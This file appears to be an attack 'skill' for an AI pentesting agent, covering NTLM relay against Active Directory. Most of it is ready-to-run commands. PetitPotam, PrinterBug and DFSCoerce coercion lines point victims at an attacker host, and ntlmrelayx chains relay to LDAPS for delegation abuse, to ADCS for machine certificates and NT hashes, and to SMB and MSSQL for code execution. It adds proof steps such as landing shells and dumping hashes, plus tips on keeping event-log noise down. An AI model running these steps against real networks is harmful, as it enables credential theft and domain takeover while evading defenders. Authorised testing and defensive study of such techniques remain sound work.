---
name: svc-relay
description: NTLM relay attacks — coercion, target selection, signing checks, relaying to LDAP/SMB/ADCS/MSSQL. Load when you can force authentication from a victim or spot NTLM auth on the network. Triggers - ntlmrelayx, Responder, PetitPotam, PrinterBug, DFSCoerce, coerce, relay, NTLMv2, signing, SMB signing disabled.
tags: [ad, ntlm, relay, lateral-movement]
---

# NTLM Relay

## When this fires
- Any domain account/computer you control can be coerced into authenticating to attacker-controlled host.
- Responder captures NTLMv2 hashes but cracking fails → relay instead of crack.
- Internal scan shows SMB signing NOT required or LDAP without signing.

## Detect (tool-first)
```bash
# Check relay viability on targets BEFORE coercing
crackmapexec smb <subnet> --gen-relay-list relay_targets.txt   # lists hosts w/o signing required
ldapsearch -x -H ldap://<dc_ip> -s base -LLL supportedCapabilities | grep -i signing
# LDAP signing not enforced (pre-2019 patch / unpatched) = relayable to LDAPS for RBCD

# Identify coercion surface of owned machine accounts
# PetitPotam (MS-EFSRPC) — works against DCs incl. patched w/ certain EFS calls
python3 PetitPotam.py -d <domain> <attacker_ip> <victim_dc_ip>
# PrinterBug (MS-RPRN) — any host with spooler enabled
python3 printerbug.py '<domain>/<user>:<pass>'@<victim> <attacker_ip>
# DFSCoerce — alternative when MS-RPRN blocked
python3 dfscoerce.py -u <user> -d <domain> <attacker_ip> <victim>
```

## Decide — capture vs relay vs crack
| Situation | Action |
|---|---|
| Hash cracks fast | Crack → cred_spray reuse check |
| Target has SMB signing required | Relay elsewhere (ADCS/LDAPS/MSSQL) |
| HTTP endpoints (ADCS /certsrv, ADFS) | HTTP rarely signs → prime relay target |
| Only local admin on victim possible | Relay to SMB for code exec |
| Domain controller as victim | Never relay back to source host; use second attacker IP/host |

## Exploit → PROVE IMPACT
```bash
# Standard relay chain: coerce → relay → escalate
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --no-da --no-acl

# Relay to LDAPS → grant RBCD on a computer you can modify = full DA path
impacket-ntlmrelayx -t ldaps://<dc_ip> --delegate-access \
  --escalate-user <owned_machine$> -smb2support

# Relay to ADCS web enrollment → cert for victim machine → certipy auth → NT hash
impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support \
  --adcs --template Machine

# Relay to MSSQL → xp_dirtree pivot or direct exec if sysadmin relayed
impacket-ntlmrelayx -t mssql://<sql_host> -smb2support

# PROOF gates:
# - SMB relay: whoami output ON TARGET via psexec/secretsdump with dumped hashes
# - LDAPS/RBCD: getST impersonation succeeds AND psexec -k lands shell
# - ADCS relay: certipy auth returns NT hash AND cme Pwn3d! confirms usable
```

## Tooling
`nmap_parse` for signing enumeration, `cme_parse` for --gen-relay-list results, `state_update` record coercion+relay chain as AttackStep, `attack_path_suggest` after relay grants new node. Pair with `svc-adcs` (ESC8) and `playbook-ad`.

## False positives / pitfalls
- **Relaying to source host fails silently** — Windows refuses same-origin relay; always coerce to different target than victim.
- **Signing "not required" ≠ relayable** — SMB1-only or QUIC-bound endpoints mislead; verify protocol actually reachable.
- **IPv6/mDNS shadow** — Responder poisoning works but victim uses IPv6 DNS; run mitm6 alongside or misses half network.
- **Event logs are loud** — 4625/auth anomalies; volume discipline, stop after first successful relay.
- **Mic check / downgrade failures** — modern Windows enforces MIC; old ntlmrelayx flags fail, keep tooling current.
